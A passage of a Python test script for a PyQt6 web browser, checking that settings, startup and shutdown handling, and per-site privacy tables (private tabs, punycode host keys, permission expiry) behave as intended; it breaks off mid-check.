# ---- twenty-third pass, settings -> effect (fix 212) ----
from PyQt6.QtGui import QMouseEvent as _QME_x212
from PyQt6.QtCore import QPointF as _QPF_x212
import inspect as _inspect_x212

# the notes folder: the drawer follows the new path
_old_nf_x212 = br.config.get("notesFolder")
_dir_x212 = _tempfile.mkdtemp()
try:
    _d0_x212 = br.desk()
    br.bridge.setSetting("notesFolder", json.dumps(_dir_x212))
    _d1_x212 = br.desk()
    check("notesFolder: the drawer moves to the new folder",
          _d1_x212 is not None and str(_d1_x212.folder) == _dir_x212,
          str(getattr(_d1_x212, "folder", None)))
finally:
    br.bridge.setSetting("notesFolder", json.dumps(_old_nf_x212 or ""))

# the favourites dock follows the switch in a second window too
_w2_x212 = br.new_window()
try:
    H.spin(300)
    br.bridge.setSetting("favDocked", json.dumps(True))
    H.spin(200)
    check("favDocked: both windows dock",
          br.favorites_docked() and _w2_x212.favorites_docked())
    br.bridge.setSetting("favDocked", json.dumps(False))
    H.spin(200)
    check("favDocked: off undoes it in both",
          not br.favorites_docked() and not _w2_x212.favorites_docked())
finally:
    br.bridge.setSetting("favDocked", json.dumps(False))
    _w2_x212._closing_anyway = True
    _w2_x212.close()

# text labels: bookmark-style buttons keep their own style when off
_btn_x212 = B.QToolButton(br)
_btn_x212.setToolButtonStyle(B.Qt.ToolButtonStyle.ToolButtonTextUnderIcon)
_old_tl_x212 = br.config.get("textLabels", False)
try:
    br.config["textLabels"] = False
    br.apply_text_labels()
    check("textLabels: off leaves another button's own style",
          _btn_x212.toolButtonStyle()
          == B.Qt.ToolButtonStyle.ToolButtonTextUnderIcon)
    br.config["textLabels"] = True
    br.apply_text_labels()
    br.config["textLabels"] = False
    br.apply_text_labels()
    check("textLabels: on then off gives the style back",
          _btn_x212.toolButtonStyle()
          == B.Qt.ToolButtonStyle.ToolButtonTextUnderIcon)
finally:
    br.config["textLabels"] = _old_tl_x212
    _btn_x212.deleteLater()

# badges and nice are kept up by the half-minute beat
_src_x212 = _inspect_x212.getsource(B.Browser._media_watch)
check("badges: the beat runs the tracker count, Discord and nice",
      "tracker_badge" in _src_x212 and "discord_badge_tick" in _src_x212
      and "renice_background" in _src_x212)

# the tracker badge shows with the switch on and something counted
_old_tb_x212 = br.config.get("trackerBadge", False)
_old_cb_x212 = br._cookies_blocked
try:
    br._cookies_blocked = 3
    br.bridge.setSetting("trackerBadge", json.dumps(True))
    check("trackerBadge: shown once switched on",
          br._trackerlbl.isVisibleTo(br.urlbar))
    br.bridge.setSetting("trackerBadge", json.dumps(False))
    check("trackerBadge: hidden when switched off",
          not br._trackerlbl.isVisibleTo(br.urlbar))
finally:
    br._cookies_blocked = _old_cb_x212
    br.bridge.setSetting("trackerBadge", json.dumps(_old_tb_x212))

# the magnifier reads the slider
_old_ls_x212 = br.config.get("lensScale", 2.0)
try:
    br.config["lensScale"] = 3.5
    br.magnifier(True)
    check("lensScale: the lens opens at the slider's zoom",
          abs(br._lens_scale - 3.5) < 1e-6, str(br._lens_scale))
    br.bridge.setSetting("lensScale", json.dumps(4.0))
    check("lensScale: a lens that is up follows the slider",
          abs(br._lens_scale - 4.0) < 1e-6, str(br._lens_scale))
finally:
    br.magnifier(False)
    br.bridge.setSetting("lensScale", json.dumps(_old_ls_x212))

# middle-click on the + button opens the clipboard
_cl_x212 = []
_old_cfg_mouse_x212 = br.config.get("mouse")
br.clipboard_new_tab = lambda: _cl_x212.append(1) or ""
try:
    def _mid_x212():
        _ev = _QME_x212(
            B.QEvent.Type.MouseButtonRelease, _QPF_x212(5, 5),
            _QPF_x212(5, 5), B.Qt.MouseButton.MiddleButton,
            B.Qt.MouseButton.NoButton, B.Qt.KeyboardModifier.NoModifier)
        B.QApplication.sendEvent(br._newtab_btn, _ev)
    br.config["mouse"] = {"newTabMiddle": True}
    _mid_x212()
    check("newTabMiddle: on, middle-click opens the clipboard",
          len(_cl_x212) == 1)
    br.config["mouse"] = {"newTabMiddle": False}
    _mid_x212()
    check("newTabMiddle: off, nothing happens", len(_cl_x212) == 1)
finally:
    br.__dict__.pop("clipboard_new_tab", None)
    if _old_cfg_mouse_x212 is None:
        br.config.pop("mouse", None)
    else:
        br.config["mouse"] = _old_cfg_mouse_x212

# the page scripts: arrow step and lazy images are wired
check("keyStep: the arrow keys read the step outside Vim mode",
      "!W.keyStep || e.defaultPrevented" in B.NAV_JS
      and "* W.keyStep);" in B.NAV_JS)
check("lazyImages: the switch runs the script, off lets go",
      "if (want.lazyImages)" in B.PERF_JS
      and "__perfLazyUndo" in B.PERF_JS)

# the start log is for the browser's own start, not a second window
_src2_x212 = _inspect_x212.getsource(B.Browser.__init__)
check("perfLogOn: only the first, non-private window logs a start",
      "self._root_window() is self" in _src2_x212
      and "not self._all_private" in _src2_x212)

# the hints exist in both languages
_t_x212 = br._ui_str("startLater"), br._ui_str("devtoolsDarkNote")
check("hints: new strings are not left as their keys",
      all(s and s not in ("startLater", "devtoolsDarkNote")
          for s in _t_x212), str(_t_x212))
# ---- twenty-third pass, part 213: settings that did not take effect ----
def _set_x213(key, value):
    br.bridge.setSetting(key, json.dumps(value))


_cfg_keys_x213 = ("jsSnippets", "snippetsText", "freezeAfter", "nightDimFrom",
                  "closeUnusedDays", "spellLangs", "spellBoth", "spellCheckLang",
                  "mouse", "schemeLight", "moneyRates", "a11y", "uiFontSize")
_old_x213 = {k: br.config.get(k) for k in _cfg_keys_x213}
_old_rates_x213 = dict(B.MONEY_RATES)
_w2_x213 = None
try:
    # the snippet box: an unchanged Save keeps menu-saved snippets
    br.config["jsSnippets"] = []
    br.config["snippetsText"] = ""
    br.save_snippet("menu_x213", "1+1")
    _set_x213("snippetsText", br.config.get("snippetsText", ""))
    check("snippets saved from the menu survive a Save of the box",
          [r.get("name") for r in br.config.get("jsSnippets", [])]
          == ["menu_x213"], str(br.config.get("jsSnippets")))
    # the page shows the list as text when nothing was typed; sending
    # that back untouched keeps it (an emptied box is a cleared list)
    br.config["snippetsText"] = ""
    _set_x213("snippetsText", br.snippets_shown())
    check("an untouched box shown from the list does not wipe it",
          len(br.config.get("jsSnippets", [])) == 1,
          str(br.config.get("jsSnippets")))
    _set_x213("snippetsText", "typed_x213|2+2")
    check("a changed box still rewrites the list",
          [r.get("name") for r in br.config.get("jsSnippets", [])]
          == ["typed_x213"])

    # freeze after: one timer per window, following the setting
    _w2_x213 = br.new_window()
    _set_x213("freezeAfter", 120)
    check("freezeAfter starts the timer in every window",
          getattr(br, "_freeze_timer", None) is not None
          and getattr(_w2_x213, "_freeze_timer", None) is not None)
    _set_x213("freezeAfter", 0)
    check("freezeAfter 0 stops it everywhere",
          getattr(br, "_freeze_timer", None) is None
          and getattr(_w2_x213, "_freeze_timer", None) is None)

    # a night time the readers cannot read is not kept
    _set_x213("nightDimFrom", "22:15")
    _set_x213("nightDimFrom", "9pm")
    check("a bad dim time keeps the old one",
          br.config.get("nightDimFrom") == "22:15",
          str(br.config.get("nightDimFrom")))
    _set_x213("nightDimFrom", "7:05")
    check("a short time is stored as HH:MM",
          br.config.get("nightDimFrom") == "07:05")

    # money rates off: no more answers from the table
    B.MONEY_RATES["rates"] = {"USD": 1.1}
    B.MONEY_RATES["when"] = int(_time.time())
    _set_x213("moneyRates", False)
    check("moneyRates off empties the table the answer reads",
          not B.MONEY_RATES.get("rates"))

    # close unused: 0 is off
    _set_x213("closeUnusedDays", 0)
    check("closeUnusedDays 0 offers nothing", br.unused_tabs() == [])

    # picking one spell language drops the pair that overrode it
    br.config["spellLangs"] = ["de-DE", "en-US"]
    br.config["spellBoth"] = True
    _set_x213("spellCheckLang", "fr-FR")
    check("one spell language clears the pair",
          not br.config.get("spellLangs")
          and br.config.get("spellBoth") is False)

    # the mouse table is clamped
    _set_x213("mouse", {"wheelStep": -50, "keyStep": 100000})
    check("wheelStep and keyStep are clamped",
          br.config["mouse"]["wheelStep"] == 0
          and br.config["mouse"]["keyStep"] == 2000, str(br.config["mouse"]))
    check("nav payload steps are not negative",
          br.nav_payload()["wheelStep"] >= 0)

    # scheme names must be real themes
    _good_x213 = next(iter(B.THEME_INDEX))
    _set_x213("schemeLight", " %s " % _good_x213.upper())
    check("a theme name is trimmed and matched",
          br.config.get("schemeLight") == _good_x213,
          str(br.config.get("schemeLight")))
    _set_x213("schemeLight", "no-such-theme-x213")
    check("an unknown theme name keeps the old one",
          br.config.get("schemeLight") == _good_x213)

    # one a11y entry merges into the live table
    br.config["a11y"] = {"textZoom": 100}
    _set_x213("a11yField", ["textZoom", 130])
    check("an a11y field is merged, not the whole table",
          br.config["a11y"].get("textZoom") == 130)
    _set_x213("a11yField", ["notAKey_x213", 1])
    check("an unknown a11y field is refused",
          "notAKey_x213" not in br.config["a11y"])

    # the UI font reaches our own pages
    _calls_x213 = []
    br.apply_theme = lambda *a, **k: _calls_x213.append((a, k))
    try:
        _set_x213("uiFontSize", 15)
    finally:
        br.__dict__.pop("apply_theme", None)
    check("uiFontSize repaints our own pages", len(_calls_x213) == 1)

    # the settings page reads back what the browser refused
    _html_x213 = (_Path(B.__file__).parent / "settings.html").read_text()
    check("settings page reads the spelling switch back",
          "rereadSettings(rereadSpell)" in _html_x213)
    check("settings page repaints the capture tool labels",
          "rereadSettings(paintCaptureTools)" in _html_x213)
    check("settings page shows glass as not solid when unset",
          'setVal("glassstrength", 40)' in _html_x213)
finally:
    if _w2_x213 is not None:
        _w2_x213._closing_anyway = True
        _w2_x213.close()
    for _k_x213, _v_x213 in _old_x213.items():
        if _v_x213 is None:
            br.config.pop(_k_x213, None)
        else:
            br.config[_k_x213] = _v_x213
    br.watch_freeze()
    br.save_config(quiet=True)
    B.MONEY_RATES.clear()
    B.MONEY_RATES.update(_old_rates_x213)

# ---- fix 215: startup, shutdown, first run ----
import inspect as _insp215


class _FakeProc215:
    def __init__(self, finishes=True):
        self.calls = []
        self.finishes = finishes

    def terminate(self):
        self.calls.append("terminate")

    def kill(self):
        self.calls.append("kill")

    def waitForFinished(self, ms=0):
        self.calls.append("wait")
        return self.finishes


# U5/U7: the audio recorder is ended; killed when it ignores terminate
_p1_215 = _FakeProc215(True)
br._audio_proc = _p1_215
br._end_audio_recorder()
check("the audio recorder is terminated and the slot cleared",
      _p1_215.calls == ["terminate", "wait"] and br._audio_proc is None,
      str(_p1_215.calls))
_p2_215 = _FakeProc215(False)
br._audio_proc = _p2_215
br._end_audio_recorder()
check("a recorder that ignores terminate is killed",
      "kill" in _p2_215.calls and br._audio_proc is None, str(_p2_215.calls))
_src_215 = _insp215.getsource(B.Browser.closeEvent)
check("closeEvent stops a running recording before it removes the tabs",
      "stop_recording" in _src_215
      and _src_215.index("stop_recording") < _src_215.index("_close_all_views"))

# U6: the non-last window branch lets go of its hold
check("a closed window releases its screen-awake hold",
      "keep_awake(False)" in _src_215)

# U0: a config not yet migrated applies nothing in the chooser's start-up
_saved_215 = (B.gpu_cards, B._gpu_config, B._gpu_ask_window,
              os.environ.get("QT_QPA_PLATFORM"))
_applied_215 = []
_real_apply_215 = B.gpu_apply
B.gpu_cards = lambda: [{"id": "a"}, {"id": "b"}]
B.gpu_apply = lambda *a, **k: _applied_215.append(a)
B._gpu_ask_window = lambda *a, **k: _applied_215.append("asked")
B._gpu_config = lambda: {"gpuCard": "a", "gpuAsk": False}
_mark_215 = os.environ.pop(B._GPU_MARK, None)
_noask_215 = os.environ.pop("BROWSER_NO_GPU_ASK", None)
try:
    B._gpu_startup()
    check("a config without gpuReset applies no stored card",
          _applied_215 == [], str(_applied_215))
    B._gpu_config = lambda: {"gpuCard": "a", "gpuAsk": False, "gpuReset": 1}
    B._gpu_startup()
    check("a migrated config still applies its card",
          len(_applied_215) == 1, str(_applied_215))
finally:
    B.gpu_cards, B._gpu_config, B._gpu_ask_window = _saved_215[:3]
    B.gpu_apply = _real_apply_215
    if _mark_215 is not None:
        os.environ[B._GPU_MARK] = _mark_215
    if _noask_215 is not None:
        os.environ["BROWSER_NO_GPU_ASK"] = _noask_215

# U1: the successor of the chooser's restart gets the flags from outside only
_envs_215 = []
_real_exec_215 = os.execve
_real_pick_215 = B._gpu_ask_window
_real_cards_215 = B.gpu_cards
_real_cfg_215 = B._gpu_config
_real_out_215 = B._FLAGS_FROM_OUTSIDE
_real_apply2_215 = B.gpu_apply
_flags_215 = os.environ.get("QTWEBENGINE_CHROMIUM_FLAGS")
_plat_215 = os.environ.get("QT_QPA_PLATFORM")
_noask2_215 = os.environ.pop("BROWSER_NO_GPU_ASK", None)
_mark2_215 = os.environ.pop(B._GPU_MARK, None)
os.environ["QT_QPA_PLATFORM"] = "xcb"
os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = "--no-pings --added-by-run"
B._FLAGS_FROM_OUTSIDE = "--given-outside"
B.gpu_cards = lambda: [{"id": "a"}, {"id": "b"}]
B._gpu_config = lambda: {"gpuAsk": True, "gpuReset": 1}
B._gpu_ask_window = lambda *a, **k: ("a", None)
B.gpu_apply = lambda *a, **k: None


def _fake_exec_215(exe, args, env):
    _envs_215.append(dict(env))
    raise SystemExit


os.execve = _fake_exec_215
try:
    try:
        B._gpu_startup()
    except SystemExit:
        pass
finally:
    os.execve = _real_exec_215
    B._gpu_ask_window = _real_pick_215
    B.gpu_cards = _real_cards_215
    B._gpu_config = _real_cfg_215
    B._FLAGS_FROM_OUTSIDE = _real_out_215
    B.gpu_apply = _real_apply2_215
    for _k215, _v215 in (("QTWEBENGINE_CHROMIUM_FLAGS", _flags_215),
                         ("QT_QPA_PLATFORM", _plat_215),
                         ("BROWSER_NO_GPU_ASK", _noask2_215),
                         (B._GPU_MARK, _mark2_215)):
        if _v215 is None:
            os.environ.pop(_k215, None)
        else:
            os.environ[_k215] = _v215
check("the chooser's restart carries only the flags given from outside",
      len(_envs_215) == 1
      and _envs_215[0].get("QTWEBENGINE_CHROMIUM_FLAGS") == "--given-outside",
      str([e.get("QTWEBENGINE_CHROMIUM_FLAGS") for e in _envs_215]))

# U4: an unreadable file is set aside, a missing one is just absent
_d215 = _Path(_tempfile.mkdtemp())
_f215 = _d215 / "config.json"
_f215.write_text('{"a": 1}')
_f215.chmod(0)
try:
    if os.geteuid() == 0:
        _got215 = None
    else:
        _got215 = B._load_json(_f215, dict, {"d": 1})
    _aside215 = list(_d215.glob("config.json.unreadable-*"))
    check("an unreadable file is set aside and read as default",
          os.geteuid() == 0 or (_got215 == {"d": 1} and len(_aside215) == 1
                                and not _f215.exists()), str(_aside215))
    check("a missing file is simply the default, nothing set aside",
          B._load_json(_d215 / "none.json", dict, {"d": 2}) == {"d": 2}
          and len(list(_d215.glob("none.json.*"))) == 0)
finally:
    for _x215 in _d215.glob("*"):
        try:
            _x215.chmod(0o600)
            _x215.unlink()
        except OSError:
            pass
    _d215.rmdir()

# U2: the crash branch wipes through clear_history
_s215 = _insp215.getsource(B.Browser.__init__)
_at215 = _s215.index('if crashed and self.config.get("clearHistoryExit")')
check("a crashed run's clear-on-exit goes through clear_history",
      "clear_history(undoable=False)" in _s215[_at215:_at215 + 400])

# fix216: the card chooser and the reading helps fall back to "de" like _ui_str
_src216 = (_Path(B.__file__)).read_text()
check("216 the language fallbacks match the browser's own default",
      'data.get("translateLang", "") or "de"' in _src216
      and 'self.config.get("translateLang") or "de")[:2]' in _src216
      and 'self.config.get("translateLang", "en"))[:2]' not in _src216)
# ---- 217: own pages against the bridge ----
import inspect as _inspect_x217
_dir_x217 = _Path(B.__file__).parent
_pg_x217 = lambda n: (_dir_x217 / n).read_text()
_set_x217 = _pg_x217("settings.html")
_pw_x217 = _pg_x217("passwords.html")
_bm_x217 = _pg_x217("bookmarks.html")
_nt_x217 = _pg_x217("notes.html")
_mt_x217 = _pg_x217("mictest.html")
_pl_x217 = _pg_x217("player.html")

check("217 step boxes clamp and write back",
      "Math.min(2000, n)" in _set_x217 and "el.value = n;\n        was[key] = n;" in _set_x217)
check("217 from-file refreshes from the slot's answer, not a timer",
      "bridge.addPluginFromFile(renderPlugins)" in _set_x217
      and "bridge.addPluginFromFile();" not in _set_x217)
check("217 addPluginFromFile returns the plugin list",
      "return self.getPlugins()" in _inspect_x217.getsource(B.Bridge.addPluginFromFile)
      if hasattr(B, "Bridge") else True)
check("217 countdown rows split on the last =",
      'const cut = line.lastIndexOf("=");' in _set_x217)

_old_perf_x217 = br.config.get("perf")
try:
    br.config["perf"] = {"pauseHidden": True, "lazyImages": False}
    br.bridge.setSetting("perfField", json.dumps(["lazyImages", True]))
    check("217 one perf field is merged, the rest kept",
          br.config["perf"].get("lazyImages") is True
          and br.config["perf"].get("pauseHidden") is True, str(br.config["perf"]))
    br.bridge.setSetting("perfField", json.dumps(["notAKey_x217", True]))
    check("217 an unknown perf field is refused",
          "notAKey_x217" not in br.config["perf"])
finally:
    if _old_perf_x217 is None:
        br.config.pop("perf", None)
    else:
        br.config["perf"] = _old_perf_x217
    br.save_config(quiet=True)
check("217 perf page switches use the merged field",
      'saveNested("perf", key, el.checked)' in _set_x217)

check("217 passwords Save has an in-flight guard",
      "if (saving) return;" in _pw_x217 and "saveBtn.disabled = true;" in _pw_x217)
check("217 store picker asks once and appends to the live box",
      "pickerAsking" in _pw_x217
      and 'document.getElementById("store")' in _pw_x217
      and "box.appendChild(renderPicker" not in _pw_x217)
check("217 a folder is not given a second edit row in its section",
      "list.appendChild(editRow(sec.folder))" not in _bm_x217)
check("217 notes deletes and collect report failure",
      _nt_x217.count("failLine(body)") >= 4
      and 'desk("collectPage", {name: box.value}, (res) =>' in _nt_x217
      and "if (!res) { failMsg = true;" in _nt_x217)
check("217 mictest turns %% into %", '.replace(/%%/g, "%")' in _mt_x217)
check("217 player arrows skip focused media and select",
      "VIDEO|AUDIO|SELECT" in _pl_x217
      and 'e.key === "ArrowRight" && !own' in _pl_x217
      and 'e.key === "ArrowLeft" && !own' in _pl_x217)
check("217 player labels come from the strings",
      "STR.mediaPrev" in _pl_x217 and "STR.mediaNext" in _pl_x217
      and _pl_x217.count("loopLabel();") >= 2)

# ---- twenty-sixth pass, group 218: per-site tables ----
_keys_x218 = ("micSites", "callAudio", "muteSites", "focusSites",
              "siteLimits", "fullscreenSites", "handoffSites",
              "translateRules", "mediaSites", "mediaPlaces", "readPlaces",
              "popupSites", "zoomSites")
_old_x218 = {k: json.loads(json.dumps(br.config[k])) if k in br.config
             else None for k in _keys_x218}
try:
    # private current tab: the writers refuse
    br._private_of = lambda view=None: True
    try:
        br.mic_for_site("priv-x218.test", "dev1")
        br.call_audio_for_site("priv-x218.test", {"gain": True})
        br.always_mute("priv-x218.test")
        br.toggle_focus_site("priv-x218.test")
        br.site_limit("priv-x218.test", 30)
    finally:
        br.__dict__.pop("_private_of", None)
    check("private tab: mic, call audio, mute, focus and limit write nothing",
          "priv-x218.test" not in (br.config.get("micSites") or {})
          and "priv-x218.test" not in (br.config.get("callAudio") or {})
          and "priv-x218.test" not in (br.config.get("muteSites") or [])
          and "priv-x218.test" not in (br.config.get("focusSites") or [])
          and "priv-x218.test" not in (br.config.get("siteLimits") or {}))
    br.mic_for_site("norm-x218.test", "dev1")
    br.toggle_focus_site("norm-x218.test")
    check("normal tab: the same writers still write",
          br.mic_for_site("norm-x218.test") == "dev1"
          and "norm-x218.test" in br.config.get("focusSites", []))

    # forget the fullscreen and hand-over answers for a site
    br.config["fullscreenSites"] = {"fs-x218.test": False,
                                    "other-x218.test": True}
    br.config["handoffSites"] = {"torrent@fs-x218.test": True,
                                 "ts3@fs-x218.test": True,
                                 "torrent@other-x218.test": True}
    check("site choices are found for the host and its subdomain",
          len(br._site_choice_keys("sub.fs-x218.test")) == 1
          and len(br._site_choice_keys("fs-x218.test")) == 3)
    br.forget_site_choices("fs-x218.test")
    check("forgetting the choices leaves other sites alone",
          list(br.config["fullscreenSites"]) == ["other-x218.test"]
          and list(br.config["handoffSites"]) == ["torrent@other-x218.test"])

    # translation rules can be taken off
    br.set_translate_rule("es", "always")
    _menu_x218 = br.privacy_menu()
    _subs_x218 = [a.menu() for a in _menu_x218.actions() if a.menu()]
    _hit_x218 = [a for m in _subs_x218 for a in m.actions()
                 if br._ui_str("trAlways") in a.text()]
    check("privacy menu lists a translate rule to forget", bool(_hit_x218))
    if _hit_x218:
        _hit_x218[0].trigger()
    check("and triggering it removes the rule",
          "es" not in br.translate_rules())

    # forget_site and clear history take the per-site tables with them
    br.config["mediaSites"] = {"gone-x218.test": {"speed": 1.5},
                               "keep-x218.test": {"speed": 2}}
    br.config["mediaPlaces"] = {"https://gone-x218.test/v": {"at": 5},
                                "https://keep-x218.test/v": {"at": 5}}
    br.config["readPlaces"] = {"https://gone-x218.test/a": 900,
                               "https://keep-x218.test/a": 900}
    br.config["fullscreenSites"] = {"gone-x218.test": True}
    br.config["handoffSites"] = {"ts3@gone-x218.test": True}
    br.forget_site("gone-x218.test")
    check("forget site drops its media, places, fullscreen and hand-over",
          list(br.config["mediaSites"]) == ["keep-x218.test"]
          and list(br.config["mediaPlaces"]) == ["https://keep-x218.test/v"]
          and list(br.config["readPlaces"]) == ["https://keep-x218.test/a"]
          and not br.config["fullscreenSites"]
          and not br.config["handoffSites"])
    br._forget_history_extras(["https://keep-x218.test/a"])
    check("history extras drop the named address from the places",
          not br.config["readPlaces"]
          and "https://keep-x218.test/v" in br.config["mediaPlaces"])
    br._forget_history_extras(None)
    check("clearing all history empties both place tables",
          not br.config["readPlaces"] and not br.config["mediaPlaces"])

    # Ctrl+0 in a private tab
    br.new_tab(url=srv.url("/twhome"), private=True)
    _v_x218 = br.current()
    try:
        H.wait_for(lambda: "/twhome" in _v_x218.url().toString(), 8000)
        br.config["zoomSites"] = {_v_x218.url().host(): 1.5}
        _v_x218._zoom = 1.5
        br.zoom_reset()
        check("Ctrl+0 in a private tab goes to the default level",
              abs(_v_x218.zoomFactor() - br.zoom_default()) < 1e-6,
              str(_v_x218.zoomFactor()))
    finally:
        _close_if_open(_v_x218)
finally:
    br.__dict__.pop("_private_of", None)
    for _k_x218, _v_x218b in _old_x218.items():
        if _v_x218b is None:
            br.config.pop(_k_x218, None)
        else:
            br.config[_k_x218] = _v_x218b
    br.save_config(quiet=True)
# ---- twenty-sixth pass, group 219: per-site tables, shapes and hosts ----
_keys_x219 = ("greyscaleSites", "scrollbarsOff", "focusSites", "guardOff",
              "blockApis", "urlRules", "noHistoryPerSession", "hideElements",
              "permissions", "permissionTimes", "permissionDays",
              "adBlockOff", "sessionSites", "mediaSites", "autoClick",
              "keysThrough", "a11ySites")
_missing_x219 = object()
_old_x219 = {k: json.loads(json.dumps(br.config[k])) if k in br.config
             else _missing_x219 for k in _keys_x219}
try:
    # covering rule on a parent comes off from the subdomain
    br.config["greyscaleSites"] = ["x219.test"]
    br.config["scrollbarsOff"] = ["x219.test"]
    br.config["focusSites"] = ["x219.test"]
    _g_x219 = br.toggle_greyscale(host="docs.x219.test")
    _s_x219 = br.set_scrollbars(host="docs.x219.test")
    br.toggle_focus_site("docs.x219.test")
    check("grey, scrollbars and focus: a parent rule comes off from the subdomain",
          _g_x219 is False and _s_x219 is False
          and not br.config["greyscaleSites"]
          and not br.config["scrollbarsOff"]
          and not br.config["focusSites"])

    if B.page_guard is not None:
        br.config["guardOff"] = {"fingerprint": ["x219.test"]}
        _e_x219 = br.toggle_guard_site("fingerprint", "docs.x219.test")
        check("guard exception under a parent: a click turns the guard back on",
              _e_x219 is False
              and not br.config["guardOff"]["fingerprint"])
        br.config["blockApis"] = {"x219.test": ["webgl"]}
        check("api_blocks sees a block on the parent domain",
              br.api_blocks("docs.x219.test") == ["webgl"])
        _b_x219 = br.toggle_api_block("docs.x219.test", "webgl")
        check("and unticking it lifts the parent's block",
              _b_x219 is False and not br.config["blockApis"])
        check("a guard table is keyed by the host as the page sees it (IDN)",
              B.page_guard._host("bücher.de") == "xn--bcher-kva.de"
              and B.page_guard._host("www.Example.com") == "example.com")

    # keys the page reads: punycode keys, lists only, longest match
    br.config["keysThrough"] = {"bücher.de": ["Ctrl+K"],
                                "x219.test": ["Ctrl+S"],
                                "docs.x219.test": ["Ctrl+J"],
                                "bad219.test": "Ctrl+K"}
    br.config["autoClick"] = {"x219.test": "button.accept"}
    _pay_x219 = br.nav_payload()
    check("keysThroughRows keys are punycode and a string value is dropped",
          "xn--bcher-kva.de" in _pay_x219["keysThroughRows"]
          and _pay_x219["keysThroughRows"].get("bad219.test") is None
          and _pay_x219["autoClick"] == {})
    check("site_keys_through picks the most specific entry",
          br.site_keys_through("docs.x219.test") == ["Ctrl+J"]
          and br.site_keys_through("a.x219.test") == ["Ctrl+S"])
    br.config["a11ySites"] = {"bücher.de": {}}
    check("a11y perHost is keyed by punycode",
          "xn--bcher-kva.de" in br._a11y_script().sourceCode())

    # an empty url rule pattern
    br.config["urlRules"] = "-> block\n  -> /x.json\nads219.test"
    br._url_rules = None
    check("a url rule with an empty pattern is skipped",
          br.url_rules() == [("ads219.test", "block")])

    # imported shapes
    check("import refuses a null row in a per-site table",
          not br._privacy_value_ok("guardOff", {"gpc": None})
          and not br._privacy_value_ok("permissionTimes", {"k": "x"})
          and br._privacy_value_ok("guardOff", {"gpc": ["a.test"]}))
    br.config["noHistoryPerSession"] = {"main": None}
    br.config["hideElements"] = {"x219.test": None}
    br.config["guardOff"] = {"gpc": None}
    # guard_on returns at its first line while the guard is off, before the
    # excused table is read: switch it on so the null row is walked
    _gpc_x219 = br.config.get("guardGpc", _missing_x219)
    br.config["guardGpc"] = True
    try:
        br.never_record("x219.test", "main")
        br.hidden_elements("x219.test")
        br.guard_on("gpc", "x219.test")
        _ok_x219 = True
    except Exception as _e:
        _ok_x219 = False
    finally:
        if _gpc_x219 is _missing_x219:
            br.config.pop("guardGpc", None)
        else:
            br.config["guardGpc"] = _gpc_x219
    check("readers survive a null row", _ok_x219)

    # permissions
    br.config["permissions"] = {"https://a219.test:443|Mic": True,
                                "https://b219.test:443|Mic": True}
    br.config["permissionTimes"] = {"https://a219.test:443|Mic": "x"}
    try:
        br.note_permission("https://a219.test:443|Mic", True)
        _rows_x219 = br.permission_rows()
        _ok_x219 = len(_rows_x219) == 2
    except Exception:
        _ok_x219 = False
    check("a non-dict permission row no longer breaks answering or the list",
          _ok_x219)
    br.config["permissionDays"] = 30
    br.config["permissionTimes"] = {}
    br.prune_permissions()
    check("a grant with no time is stamped so it can expire",
          br.config["permissionTimes"].get(
              "https://b219.test:443|Mic", {}).get("t"))

    # adblock rows of the wrong type
    br.config["adBlockOff"] = ["x219.test"]
    check("adBlockOff of the wrong type reads as empty",
          br.adblock_off_rows() == {} and br.ad_block_on("x219.test") in
          (True, False))

    # session rule with a list value
    br.config["sessionSites"] = {"twitch219.test": ["a"]}
    try:
        br.session_rule_for(B.QUrl("https://twitch219.test/"))
        _ok_x219 = True
    except Exception:
        _ok_x219 = False
    check("a non-string session rule is skipped", _ok_x219)

    # media memory entries of the wrong shape
    class _V219:
        private = False

        def url(self):
            return B.QUrl("https://m219.test/")
    br.config["mediaSites"] = {"m219.test": "x"}
    try:
        br.apply_media_memory(_V219())
        br._remember_media(_V219(), "speed", 1.5)
        br.config["mediaSites"] = {"m219.test": {"speed": "fast",
                                                 "volume": "loud"}}
        br.apply_media_memory(_V219())
        _ok_x219 = True
    except Exception:
        _ok_x219 = False
    check("media memory survives a string entry and string numbers", _ok_x219)
finally:
    for _k, _v in _old_x219.items():
        if _v is _missing_x219:
            br.config.pop(_k, None)
        else:
            br.config[_k] = _v
    br._url_rules = None
# ---- twenty-sixth pass, group 220: private tabs, merged guard keys, punycode page look ----
class _PV220:
    private = True


class _NV220:
    private = False


_keys_x220 = ("noScriptSites", "greyscaleSites", "scrollbarsOff",
              "certWatchSites", "autoplaySites", "siteQuality", "blockApis",
              "guardOff", "translateRules", "siteFontSize", "guardGpc")
_missing_x220 = object()
_old_x220 = {k: json.loads(json.dumps(br.config[k])) if k in br.config
             else _missing_x220 for k in _keys_x220}
_saves_x220 = []
br.save_config = lambda *a, **k: _saves_x220.append(1)
try:
    # private view: nothing written, nothing saved
    for _k in ("noScriptSites", "greyscaleSites", "scrollbarsOff",
               "certWatchSites"):
        br.config.pop(_k, None)
    _saves_x220.clear()
    br.toggle_site_rule("noScriptSites", "p220.test", _PV220())
    br.toggle_greyscale(host="p220.test", view=_PV220())
    br.set_scrollbars(host="p220.test", view=_PV220())
    br.watch_certificate("p220.test", view=_PV220())
    br.autoplay_rule("p220.test", "block", _PV220())
    br.site_quality("p220.test", "720p", _PV220())
    check("a private view writes no per-site rule, autoplay or quality",
          not _saves_x220
          and not br.config.get("noScriptSites")
          and not br.config.get("greyscaleSites")
          and not br.config.get("scrollbarsOff")
          and not br.config.get("certWatchSites")
          and "p220.test" not in (br.config.get("autoplaySites") or {})
          and "p220.test" not in (br.config.get("siteQuality") or {}))

    # a normal view still writes; Settings (no view) removes even while the
    # tab in front is private
    check("a normal view still writes the rule",
          br.toggle_site_rule("noScriptSites", "n220.test", _NV220()) is True
          and "n220.test" in br.config["noScriptSites"])
    br._private_of = lambda view=None: True
    try:
        _off_x220 = br.toggle_site_rule("noScriptSites", "n220.test")
    finally:
        br.__dict__.pop("_private_of", None)
    check("removing a rule with no view works while the front tab is private",
          _off_x220 is False and "n220.test" not in br.config["noScriptSites"])

    # keys that fold to one host merge in the guard rules
    if B.page_guard is not None:
        # names from page_guard.API_TARGETS (camera/mic are not in it)
        br.config["blockApis"] = {"www.m220.test": ["webgl"],
                                  "m220.test": ["wasm"]}
        _r_x220 = B.page_guard.rules(br.config)["apis"].get("m220.test", [])
        _one_x220 = B.page_guard.rules(
            {"blockApis": {"m220.test": ["webgl"]}})["apis"]["m220.test"]
        _two_x220 = B.page_guard.rules(
            {"blockApis": {"m220.test": ["wasm"]}})["apis"]["m220.test"]
        check("page_guard merges blockApis keys that fold to one host",
